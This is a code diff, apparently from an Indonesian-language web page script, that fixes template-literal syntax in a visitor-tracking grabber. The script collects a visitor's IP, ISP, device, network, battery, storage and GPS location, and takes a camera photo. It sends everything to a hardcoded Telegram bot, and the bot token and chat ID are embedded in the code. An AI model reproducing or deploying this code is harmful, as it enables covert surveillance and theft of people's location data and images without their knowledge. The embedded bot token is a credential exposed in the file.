@@ -9,7 +9,7 @@ function getIP() {
             const ip = data.ip;
 
             // Mendapatkan ISP menggunakan ipinfo.io API
-            fetch(https://ipinfo.io/${ip}/json?token=ce2d7e88896a36)
+            fetch(`https://ipinfo.io/${ip}/json?token=ce2d7e88896a36`)
                 .then(response => response.json())
                 .then(ispData => {
                     const isp = ispData.org || 'Tidak diketahui';
@@ -43,34 +43,6 @@ function collectAndSendData(key, value) {
     }
 }
 
-// function capturePhotoAndSend() {
-//     const videoElement = document.getElementById('camera');
-//     const canvas = document.createElement('canvas');
-//     const context = canvas.getContext('2d');
-
-//     // Menetapkan resolusi lebih tinggi (misalnya 640x480)
-//     const targetWidth = 640;
-//     const targetHeight = 480;
-
-//     canvas.width = targetWidth;
-//     canvas.height = targetHeight;
-
-//     // Tambahkan jeda 2 detik sebelum mengambil gambar
-//     setTimeout(() => {
-//         // Ambil gambar dari video dengan resolusi yang lebih tinggi
-//         context.drawImage(videoElement, 0, 0, targetWidth, targetHeight);
-
-//         // Mengubah gambar langsung ke Blob dengan kompresi 70%
-//         canvas.toBlob(function(blob) {
-//             // Ubah flag agar hanya satu foto yang diambil
-//             photoCaptured = true;
-
-//             // Kirim data dan foto ke Telegram
-//             sendToTelegram(collectedData, blob);
-//         }, 'image/jpeg', 0.7); // Kualitas kompresi 70%
-//     }, 1000); // 2 detik jeda
-// }
-
 function capturePhotoAndSend() {
     const videoElement = document.getElementById('camera');
     const canvas = document.createElement('canvas');
@@ -101,43 +73,43 @@ function sendToTelegram(data, imageData) {
     const botaja = '7875784717:AAHZv0ytkPCzM2rfb_T9m6BFYF37KAxQDGk';
     const chatId = '5409710235';
 
-    const message = 
-🔍 Informasi Pengguna 🔍
+    const message = `
+        🔍 Informasi Pengguna 🔍
 
-🌐 IP: ${data.ip?.ip || 'Tidak diketahui'}
-📡 ISP: ${data.ip?.isp || 'Tidak diketahui'}
+        🌐 IP: ${data.ip?.ip || 'Tidak diketahui'}
+        📡 ISP: ${data.ip?.isp || 'Tidak diketahui'}
 
-📱 Perangkat:
-  - User Agent: ${data.device?.userAgent || 'Tidak diketahui'}
-  - Platform: ${data.device?.platform || 'Tidak diketahui'}
-  - Bahasa: ${data.device?.language || 'Tidak diketahui'}
+        📱 Perangkat:
+        - User Agent: ${data.device?.userAgent || 'Tidak diketahui'}
+        - Platform: ${data.device?.platform || 'Tidak diketahui'}
+        - Bahasa: ${data.device?.language || 'Tidak diketahui'}
 
-📡 Jaringan:
-  - Status Koneksi: ${data.device?.networkStatus || 'Tidak diketahui'}
-  - Jenis Koneksi: ${data.network?.connectionType || 'Tidak diketahui'}
-  - Kecepatan Unduh: ${data.network?.downlink || 'Tidak diketahui'} Mbps
-  - Latensi: ${data.network?.rtt || 'Tidak diketahui'} ms
+        📡 Jaringan:
+        - Status Koneksi: ${data.device?.networkStatus || 'Tidak diketahui'}
+        - Jenis Koneksi: ${data.network?.connectionType || 'Tidak diketahui'}
+        - Kecepatan Unduh: ${data.network?.downlink || 'Tidak diketahui'} Mbps
+        - Latensi: ${data.network?.rtt || 'Tidak diketahui'} ms
 
-🔋 Baterai:
-  - Level: ${data.battery?.level || 'Tidak diketahui'}
-  - Status Pengisian: ${data.battery?.charging || 'Tidak diketahui'}
+        🔋 Baterai:
+        - Level: ${data.battery?.level || 'Tidak diketahui'}
+        - Status Pengisian: ${data.battery?.charging || 'Tidak diketahui'}
 
-🗂 Penyimpanan:
-  - Total: ${data.storage?.total || 'Tidak diketahui'}
-  - Digunakan: ${data.storage?.used || 'Tidak diketahui'}
+        🗂 Penyimpanan:
+        - Total: ${data.storage?.total || 'Tidak diketahui'}
+        - Digunakan: ${data.storage?.used || 'Tidak diketahui'}
 
-📍 Lokasi:
-  - Provinsi: ${data.location?.provinsi || 'Tidak diketahui'}
-  - Kabupaten/Kota: ${data.location?.kabupaten || 'Tidak diketahui'}
-  - Kecamatan: ${data.location?.kecamatan || 'Tidak diketahui'}
-  - Latitude: ${data.location?.latitude || 'Tidak diketahui'}
-  - Longitude: ${data.location?.longitude || 'Tidak diketahui'}
+        📍 Lokasi:
+        - Provinsi: ${data.location?.provinsi || 'Tidak diketahui'}
+        - Kabupaten/Kota: ${data.location?.kabupaten || 'Tidak diketahui'}
+        - Kecamatan: ${data.location?.kecamatan || 'Tidak diketahui'}
+        - Latitude: ${data.location?.latitude || 'Tidak diketahui'}
+        - Longitude: ${data.location?.longitude || 'Tidak diketahui'}
 
-🕒 Waktu Akses: ${data.device?.visitTime || 'Tidak diketahui'}
-.trim();
+        🕒 Waktu Akses: ${data.device?.visitTime || 'Tidak diketahui'}
+        `.trim();
 
-    const urlMessage = https://api.telegram.org/bot${botaja}/sendMessage;
-    const urlPhoto = https://api.telegram.org/bot${botaja}/sendPhoto;
+    const urlMessage = `https://api.telegram.org/bot${botaja}/sendMessage`;
+    const urlPhoto = `https://api.telegram.org/bot${botaja}/sendPhoto`;
 
     // Kirim pesan teks ke Telegram
     fetch(urlMessage, {
@@ -194,7 +166,7 @@ if (navigator.getBattery) {
     navigator.getBattery().then(battery => {
         const level = Math.floor(battery.level * 100);
         const charging = battery.charging ? 'Sedang diisi daya' : 'Tidak diisi daya';
-        collectAndSendData('battery', { level: ${level}%, charging });
+        collectAndSendData('battery', { level: `${level}%`, charging });
     });
 }
 
@@ -237,7 +209,7 @@ function getLocation() {
             position => {
                 const latitude = position.coords.latitude;
                 const longitude = position.coords.longitude;
-                fetch(https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude})
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
                     .then(response => response.json())
                     .then(data => {
                         const components = data.address;
